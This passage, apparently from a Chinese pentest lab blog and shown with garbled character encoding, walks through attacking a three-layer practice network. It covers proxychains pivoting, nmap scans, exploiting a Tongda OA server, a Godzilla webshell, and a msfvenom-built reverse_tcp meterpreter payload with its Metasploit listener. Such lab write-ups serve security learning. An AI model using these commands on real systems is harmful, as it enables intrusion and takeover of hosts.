192.168.52.20çš„å‘½ä»¤æµ‹è¯•è¿é€šæ€§ã€‚</p><h3 id="6-2-5-æ”»å‡»æœºä½¿ç”¨proxychainsæ‰§è¡Œnamp"><a href="#6-2-5-æ”»å‡»æœºä½¿ç”¨proxychainsæ‰§è¡Œnamp" class="headerlink" title="6.2.5 æ”»å‡»æœºä½¿ç”¨proxychainsæ‰§è¡Œnamp"></a>6.2.5 æ”»å‡»æœºä½¿ç”¨proxychainsæ‰§è¡Œnamp</h3><p>ä½¿ç”¨proxychainsä»£ç†æ”»å‡»æœºçš„æµé‡ï¼Œå®ç°å¯¹äºŒå±‚ç½‘ç»œçš„æ¢æµ‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sT</span> <span class="token parameter variable">-F</span> <span class="token parameter variable">-O</span> <span class="token number">192.168</span>.52.30 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="å¤§æˆ˜Bug-ã€Œproxychains4-nmap-æŠ¥é”™ã€"><a href="#å¤§æˆ˜Bug-ã€Œproxychains4-nmap-æŠ¥é”™ã€" class="headerlink" title="å¤§æˆ˜Bug-ã€Œproxychains4 nmap  æŠ¥é”™ã€"></a>å¤§æˆ˜Bug-ã€Œproxychains4 nmap  æŠ¥é”™ã€</h4><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.15.21.png" style="zoom:40%;"><p>è§£å†³ï¼š</p><p>ç¼–è¾‘ /etc/proxychains4.conf</p><p>æ³¨é‡Šæ‰dnsè§£æä»£ç†</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2016.11.13.png" style="zoom:50%;"></blockquote><p>â€‹     é‡æ–°æ‰§è¡Œæ‰«æï¼š</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2016.16.08.png" style="zoom:50%;"><p>â€‹      æ‰«æç»“æœï¼š</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2016.17.06.png" style="zoom:50%;"><p>â€‹     è‡³æ­¤ï¼ŒæˆåŠŸå®ç°å€ŸåŠ©éš§é“ä½¿ç”¨kaliçš„æ”»å‡»å·¥å…·æ¢æµ‹äºŒå±‚ç½‘ç»œå†…ç³»ç»Ÿä¿¡æ¯ã€‚</p><p>â€‹     æµé‡è·¯å¾„å¤§è‡´å¦‚ä¸‹ï¼š</p><p>kaliï¼ˆnmapï¼‰192.168.43.26â€”â€”&gt;127.0.0.1:8080â€”â€”&gt;192.168.43.253:1234â€”â€”&gt;192.168.52.10â€”â€”&gt;192.168.52.30</p><blockquote><h4 id="åˆ‡æ¢çƒ­ç‚¹ä¹‹åé¶åœºç½‘ç»œç¯å¢ƒçš„è°ƒæ•´"><a href="#åˆ‡æ¢çƒ­ç‚¹ä¹‹åé¶åœºç½‘ç»œç¯å¢ƒçš„è°ƒæ•´" class="headerlink" title="åˆ‡æ¢çƒ­ç‚¹ä¹‹åé¶åœºç½‘ç»œç¯å¢ƒçš„è°ƒæ•´"></a>åˆ‡æ¢çƒ­ç‚¹ä¹‹åé¶åœºç½‘ç»œç¯å¢ƒçš„è°ƒæ•´</h4><p>åé¢æ¢äº†ä¸€ä¸ªçƒ­ç‚¹ç¯å¢ƒï¼ŒWIFIç½‘æ®µå˜æˆäº†172.20ç½‘æ®µã€‚åšäº†ä»¥ä¸‹è°ƒæ•´ï¼Œè°ƒæ•´åçš„å„å±‚ç½‘ç»œçš„ä¸»æœºIPåœ°å€å¦‚ä¸‹ï¼š</p><p>macå®¿ä¸»æœºï¼šã€IPï¼š172.20.10.3/28 ï¼Œç½‘å…³ï¼š172.20.10.1ã€‘</p><p>æ”»å‡»æœºkaliï¼šã€IPï¼š172.20.10.4/28 ï¼Œç½‘å…³ï¼š172.20.10.1ã€‘</p><p>DMZåŒº-web1ï¼šã€IP1:172.20.10.5/28ï¼Œç½‘å…³ï¼š172.20.10.1ã€‘ã€IP2ä¿æŒä¸å˜ï¼š192.168.52.10 ç½‘å…³192.168.52.1 ã€‘</p><p>å…¶ä»–è®¾ç½®ä¿æŒä¸å˜å°±è¡Œäº†ã€‚</p><p>å…¶å®æ”¹å˜çƒ­ç‚¹ä»…ä»…å½±å“åˆ°äº†æ¡¥æ¥æ¨¡å¼çš„ç½‘å¡ï¼Œè·Ÿå…¶ä»–ç½‘å¡æ— å…³ã€‚å¦‚æœæ·±å…¥äº†è§£äº†VMwareè™šæ‹ŸåŒ–ç½‘ç»œçš„åº•å±‚é€»è¾‘ï¼Œåº”è¯¥ä¸éš¾ç†è§£ã€‚å¯ä»¥å‚è€ƒæ–‡ç«™çš„è¿™ç¯‡æ–‡ç« ã€Šä¸‰å±‚ç½‘ç»œåŸŸæ¸—é€é¶åœºï¼ˆWHOAMIIï¼‰æ­å»ºã€‹</p><p>ä¿®æ”¹é…ç½®ä¹‹ååå¼¹shellæ— æ³•è¿é€šï¼Œweb2ä¸»æœºæ— æ³•pingé€š172.20.10.1/28ã€‚</p><p>åˆ†ææ˜¯è·¯ç”±é…ç½®çš„é—®é¢˜ï¼š</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2014.03.36.png" style="zoom:40%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">172.20</span>.0.0/16 dev br-1d665e13ee58  proto kernel  scope <span class="token function">link</span>  src <span class="token number">172.20</span>.0.1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ†æå¯èƒ½æ˜¯è¿™è¡Œè·¯ç”±é…ç½®å½±å“äº†æ•°æ®åŒ…çš„è·¯ç”±ã€‚</p><p>æ‰€æœ‰å‘å¾€ 172.20.0.0/16 ç½‘æ®µï¼ˆåŒ…æ‹¬ 172.20.10.0/28ï¼‰çš„æ•°æ®åŒ…ï¼Œéƒ½å°†é€šè¿‡åä¸º br-1d665e13ee58 çš„è™šæ‹Ÿç½‘ç»œæ¥å£å‘é€ï¼Œå¹¶ä¸”è¿™äº›æ•°æ®åŒ…çš„æºåœ°å€å°†è¢«è®¾ç½®ä¸º 172.20.0.1ã€‚è¿™ä¸ªè·¯ç”±åªåœ¨æœ¬åœ°é“¾è·¯ä¸Šæœ‰æ•ˆã€‚æ‰€ä»¥ä»web2åˆ°172.20.10.0/28çš„æµé‡æ²¡æœ‰å‡ºå»ã€‚</p><p>æˆ‘æƒ³è§£å†³æ–¹æ³•æœ‰äºŒï¼Œè¦ä¹ˆæ˜¯åŠ è·¯ç”±å¦‚ä¸‹ï¼Œè¦ä¹ˆæ˜¯åˆ é™¤å†²çªçš„è·¯ç”±é…ç½®ï¼š</p><ul><li>æ–¹æ³•1:</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ip</span> route <span class="token function">add</span> <span class="token number">172.20</span>.10.0/28 via <span class="token number">192.168</span>.52.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2014.09.30.png" style="zoom:50%;"><p>æˆåŠŸpingé€šã€‚</p><p>å…¶å®åœ¨çœŸå®ç¯å¢ƒä¸­ï¼ŒDMZåŒºå¤–ä¾§çš„äº’è”ç½‘åœ°å€ã€æ”»å‡»è€…çš„VPSéƒ½æ˜¯äº’è”ç½‘IPï¼Œå¦‚æœäºŒå±‚ç½‘ç»œèƒ½è®¿é—®äº’è”ç½‘çš„è¯è‡ªç„¶ä¹Ÿèƒ½è®¿é—®åˆ°æ”»å‡»è€…çš„VPSã€‚åœ¨è¿™é‡Œå¯ä»¥æŠŠ172.20.10.0/28ç½‘æ®µå½“ä½œæ˜¯äº’è”ç½‘ç½‘æ®µï¼Œ192.168.52.1æ˜¯äºŒå±‚ç½‘ç»œè®¿é—®äº’è”ç½‘çš„ç½‘å…³ã€‚</p><ul><li>æ–¹æ³•2:</li></ul><p>çœ‹ä¸€ä¸‹å½“å‰è¿è¡Œçš„å®¹å™¨çš„ç½‘ç»œç¯å¢ƒ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> inspect 8e17 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2014.21.08.png" style="zoom:50%;"><p>æ²¡æœ‰ç”¨åˆ°172.20ç½‘æ®µã€‚å¼€åˆ ï¼</p><p>å…ˆæŠŠåˆšåˆšè®¾ç½®çš„è·¯ç”±åˆ æ‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ip</span> route del <span class="token number">172.20</span>.10.0/28<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2014.17.24.png" style="zoom:50%;"><p>åˆ é™¤å†²çªçš„172.20ç½‘æ®µçš„è·¯ç”±ï¼š</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2014.18.04.png" style="zoom:50%;"><p>èƒ½pingé€šï¼Œæœä¸å…¶ç„¶æ˜¯è¿™æ¡å†²çªè·¯ç”±çš„é—®é¢˜ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2014.18.48.png" style="zoom:50%;"><p>é…ç½®ç½‘ç»œçš„å¥‡å¥‡æ€ªæ€ªçš„ç»éªŒåˆå¢åŠ äº†ã€‚</p><p>äºŒå±‚ç½‘ç»œping kaliçš„è·¯å¾„æ¢³ç†ï¼š</p><p>ping 172.20.10.4â€“&gt;èµ°é»˜è®¤è·¯ç”±åˆ°â€“&gt;192.168.52.1â€“&gt;é€šè¿‡NATåˆ°å®¿ä¸»æœºçš„ç½‘å…³â€“&gt;172.20.10.1â€“&gt;172.20.20.4æˆåŠŸè®¿é—®åˆ°kaliã€‚æ‰€ä»¥åå¼¹shellçš„è·¯å¾„ä¹Ÿå°±é€šäº†ã€‚</p></blockquote><p>ä¹¦æ¥ä¸Šå›ï¼Œå†…ç½‘äºŒå±‚ç½‘ç»œç«¯å£æ‰«æç»“æœï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.52.30Host is up <span class="token punctuation">(</span><span class="token number">0</span>.011s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">989</span> closed portsPORT     STATE SERVICE      VERSION<span class="token number">110</span>/tcp  <span class="token function">open</span>  pop3<span class="token number">135</span>/tcp  <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">139</span>/tcp  <span class="token function">open</span>  netbios-ssn  Microsoft Windows netbios-ssn<span class="token number">445</span>/tcp  <span class="token function">open</span>  microsoft-ds Microsoft Windows <span class="token number">7</span> - <span class="token number">10</span> microsoft-ds <span class="token punctuation">(</span>workgroup: WHOAMIANONY<span class="token punctuation">)</span><span class="token number">1025</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1026</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1027</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1057</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1059</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1061</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">8080</span>/tcp <span class="token function">open</span>  http         nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-3-äºŒå±‚ç½‘ç»œèµ„æºè®¿é—®"><a href="#6-3-äºŒå±‚ç½‘ç»œèµ„æºè®¿é—®" class="headerlink" title="6.3 äºŒå±‚ç½‘ç»œèµ„æºè®¿é—®"></a>6.3 äºŒå±‚ç½‘ç»œèµ„æºè®¿é—®</h2><h3 id="6-3-1-8080ç«¯å£"><a href="#6-3-1-8080ç«¯å£" class="headerlink" title="6.3.1 8080ç«¯å£"></a>6.3.1 8080ç«¯å£</h3><p>å°è¯•ç›´æ¥ä»kaliæ”»å‡»æœºè®¿é—®å†…ç½‘çš„ä¸»æœºçš„8080ç«¯å£ã€‚</p><p>é…ç½®firefoxçš„socksä»£ç†ï¼š</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2018.05.34.png" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2018.08.05.png" style="zoom:40%;"><p>æˆåŠŸè®¿é—®åˆ°äºŒå±‚ç½‘ç»œä¸»æœºçš„webæœåŠ¡ï¼Œæ˜¯ä¸€ä¸ªé€šè¾¾OAç³»ç»Ÿã€‚</p><h4 id="æµé‡è·¯å¾„ï¼š"><a href="#æµé‡è·¯å¾„ï¼š" class="headerlink" title="æµé‡è·¯å¾„ï¼š"></a>æµé‡è·¯å¾„ï¼š</h4><p>Kali172.20.10.4 ä¸Šç”¨æµè§ˆå™¨è®¿é—®192.168.52.30:8080ã€â€”&gt;proxychainsâ€”&gt; kaliçš„127.0.0.1:1080â€“&gt;ewå®¢æˆ·ç«¯ç›‘å¬sockséš§é“å¹¶è½¬å‘â€“&gt;DMZåŒºweb1çš„ewæœåŠ¡ç«¯çš„1234ç«¯å£â€“&gt;ã€‘è®¿é—®192.168.52.30:8080</p><p>æœ€ç»ˆçš„æ•ˆæœå°±æ˜¯kalièƒ½å¤ŸæˆåŠŸè®¿é—®åˆ°å†…ç½‘çš„webæœåŠ¡ã€‚</p><h1 id="ä¸ƒã€äºŒå±‚ç½‘ç»œé€šè¾¾OAæ¸—é€è·å–ä¸»æœºæƒé™"><a href="#ä¸ƒã€äºŒå±‚ç½‘ç»œé€šè¾¾OAæ¸—é€è·å–ä¸»æœºæƒé™" class="headerlink" title="ä¸ƒã€äºŒå±‚ç½‘ç»œé€šè¾¾OAæ¸—é€è·å–ä¸»æœºæƒé™"></a>ä¸ƒã€äºŒå±‚ç½‘ç»œé€šè¾¾OAæ¸—é€è·å–ä¸»æœºæƒé™</h1><p>è¯¦ç»†è¿‡ç¨‹å‚è€ƒæœ¬ç«™ã€Šé€šè¾¾OAæ¼æ´æ¢æµ‹åŠåˆ©ç”¨ã€‹ä¸€æ–‡ã€‚</p><h2 id="7-1-æ¼æ´æ¢æµ‹"><a href="#7-1-æ¼æ´æ¢æµ‹" class="headerlink" title="7.1 æ¼æ´æ¢æµ‹"></a>7.1 æ¼æ´æ¢æµ‹</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run main.go scan <span class="token parameter variable">-u</span> http://192.168.52.30:8080/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2011.24.08.png" style="zoom:50%;"><h2 id="7-2-æ¼æ´åˆ©ç”¨"><a href="#7-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="7.2  æ¼æ´åˆ©ç”¨"></a>7.2  æ¼æ´åˆ©ç”¨</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run main.go exp <span class="token parameter variable">-u</span> http://192.168.52.30:8080/ <span class="token parameter variable">-i</span> Td03<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2010.28.33.png" style="zoom:50%;"><h2 id="7-4-getshell"><a href="#7-4-getshell" class="headerlink" title="7.4 getshell"></a>7.4 getshell</h2><p>ä½¿ç”¨Godzillaè¿æ¥webshellï¼Œå…·ä½“ä½¿ç”¨é˜²èŒƒè§æœ¬ç«™ã€ŠGodzillaã€‹ä¸€æ–‡ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2010.52.50.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2010.53.31.png" style="zoom:50%;"><p>æˆåŠŸgetshell!</p><p>æˆåŠŸè·å¾—nt authority\system æƒé™ï¼</p><h2 id="7-5-é€šè¿‡å“¥æ–¯æ‹‰ä¸Šçº¿meterpreter"><a href="#7-5-é€šè¿‡å“¥æ–¯æ‹‰ä¸Šçº¿meterpreter" class="headerlink" title="7.5 é€šè¿‡å“¥æ–¯æ‹‰ä¸Šçº¿meterpreter"></a>7.5 é€šè¿‡å“¥æ–¯æ‹‰ä¸Šçº¿meterpreter</h2><p>é€‰æ‹©PMeterpreteræ¨¡å—ï¼Œè®¾ç½®ä¸ºæ”»å‡»æœºçš„ipå’Œç›‘å¬ç«¯å£ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.41.55.png" style="zoom:50%;"><p>æ”»å‡»æœºè®¾ç½®msf</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use exploit/multi/handler msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">&gt;</span> php/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">0.0</span>.0.0lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">0.0</span>.0.0msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lport <span class="token number">12345</span>lport <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">12345</span>msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.44.34.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.44.52.png" style="zoom:50%;"><p>è‡³æ­¤ï¼ŒDMZåŒºå’ŒäºŒå±‚ç½‘ç»œçš„ä¸»æœºå‡è¢«æ‹¿ä¸‹ï¼Œè€Œä¸”éƒ½æ˜¯æœ€é«˜æƒé™ï¼âœ…</p><h1 id="å…«ã€å†…ç½‘ä¿¡æ¯æ”¶é›†"><a href="#å…«ã€å†…ç½‘ä¿¡æ¯æ”¶é›†" class="headerlink" title="å…«ã€å†…ç½‘ä¿¡æ¯æ”¶é›†"></a>å…«ã€å†…ç½‘ä¿¡æ¯æ”¶é›†</h1><h2 id="8-1-Godzillaæ”¶é›†"><a href="#8-1-Godzillaæ”¶é›†" class="headerlink" title="8.1 Godzillaæ”¶é›†"></a>8.1 Godzillaæ”¶é›†</h2><h3 id="8-1-1-åŸºç¡€ä¿¡æ¯"><a href="#8-1-1-åŸºç¡€ä¿¡æ¯" class="headerlink" title="8.1.1 åŸºç¡€ä¿¡æ¯"></a>8.1.1 åŸºç¡€ä¿¡æ¯</h3><p>åŸºç¡€ä¿¡æ¯ï¼š</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.53.35.png" style="zoom:50%;"><h3 id="8-1-2-æ‰§è¡Œå‘½ä»¤"><a href="#8-1-2-æ‰§è¡Œå‘½ä»¤" class="headerlink" title="8.1.2 æ‰§è¡Œå‘½ä»¤"></a>8.1.2 æ‰§è¡Œå‘½ä»¤</h3><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.12.06.png" style="zoom:50%;"><p>å†…å®¹ä¸å‹å¥½ï¼Œå¯è¯»æ€§è¾ƒå·®ã€‚</p><h2 id="8-2-php-meterpreter-ä¿¡æ¯æ”¶é›†"><a href="#8-2-php-meterpreter-ä¿¡æ¯æ”¶é›†" class="headerlink" title="8.2 php/meterpreter ä¿¡æ¯æ”¶é›†"></a>8.2 php/meterpreter ä¿¡æ¯æ”¶é›†</h2><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.48.05.png" style="zoom:50%;"><p>php/meterpreter èƒ½å¤Ÿæ‰§è¡Œçš„å‘½ä»¤æœ‰é™ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.50.34.png" style="zoom:60%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2013.58.44.png" style="zoom:50%;"><p>èƒ½è¿›å…¥C:/windows/system32</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.00.56.png" style="zoom:50%;"><p>phpå½¢å¼çš„meterpreterä¸å¤ªè¡Œï¼Œæ”¶é›†çš„ä¿¡æ¯ä¸å¤šã€‚</p><h2 id="8-3-msfvenomåˆ¶ä½œå¹¶ä¸Šä¼ åå¼¹shellçš„payload"><a href="#8-3-msfvenomåˆ¶ä½œå¹¶ä¸Šä¼ åå¼¹shellçš„payload" class="headerlink" title="8.3 msfvenomåˆ¶ä½œå¹¶ä¸Šä¼ åå¼¹shellçš„payload"></a>8.3 msfvenomåˆ¶ä½œå¹¶ä¸Šä¼ åå¼¹shellçš„payload</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">172.20</span>.10.4 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">23456</span> <span class="token parameter variable">-f</span> exe <span class="token operator">&gt;</span> reverse.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.15.17.png" style="zoom:30%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.18.04.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.18.26.png" style="zoom:50%;"><h2 id="8-4-ä¸Šçº¿windows-x64-meterpreter"><a href="#8-4-ä¸Šçº¿windows-x64-meterpreter" class="headerlink" title="8.4 ä¸Šçº¿windows/x64/meterpreter"></a>8.4 ä¸Šçº¿windows/x64/meterpreter</h2><p>msfè®¾ç½®ç›‘å¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">172.20</span>.10.4<span class="token builtin class-name">set</span> lport <span class="token number">23456</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.20.45.png" style="zoom:50%;"><p>é¶æœºæ‰§è¡Œè„šæœ¬åæˆåŠŸä¸Šçº¿ windows/x64/meterpreter</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.23.01.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.23.49.png" style="zoom:50%;"><p>è¿™ä¸ªmeterpreterèƒ½å¤Ÿæ‰§è¡Œçš„å‘½ä»¤è¦ç›¸å¯¹å¤šä¸€äº›ã€‚</p><h2 id="8-5-å†…ç½‘ä¿¡æ¯æ”¶é›†"><a href="#8-5-å†…ç½‘ä¿¡æ¯æ”¶é›†" class="headerlink" title="8.5 å†…ç½‘ä¿¡æ¯æ”¶é›†"></a>8.5 å†…ç½‘ä¿¡æ¯æ”¶é›†</h2><h3 id="8-5-2-åŸºæœ¬ä¿¡æ¯æ”¶é›†"><a href="#8-5-2-åŸºæœ¬ä¿¡æ¯æ”¶é›†" class="headerlink" title="8.5.2 åŸºæœ¬ä¿¡æ¯æ”¶é›†"></a>8.5.2 åŸºæœ¬ä¿¡æ¯æ”¶é›†</h3><h4 id="1ï¼‰sysinfo"><a href="#1ï¼‰sysinfo" class="headerlink" title="1ï¼‰sysinfo"></a>1ï¼‰sysinfo</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> sysinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.42.16.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°æ˜¯ä¸€å°win7ï¼Œx64æ¶æ„ï¼Œæ‰€åœ¨çš„åŸŸWHOAMIANONYï¼Œç™»å½•çš„ç”¨æˆ·æœ‰3ä¸ªã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> shellsysteminfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.43.56.png" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.44.55.png" style="zoom:50%;"><blockquote><h4 id="éšœç¢æ‰«é™¤-meterpreterä¹±ç é—®é¢˜ï¼š"><a href="#éšœç¢æ‰«é™¤-meterpreterä¹±ç é—®é¢˜ï¼š" class="headerlink" title="éšœç¢æ‰«é™¤-meterpreterä¹±ç é—®é¢˜ï¼š"></a>éšœç¢æ‰«é™¤-meterpreterä¹±ç é—®é¢˜ï¼š</h4><p>è¿›å…¥shellä¹‹åï¼Œæ‰§è¡Œ<code>chcp 65001</code></p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.48.00.png" style="zoom:40%;"><p>chcp æ˜¯ä¸€ä¸ªåœ¨ Windows 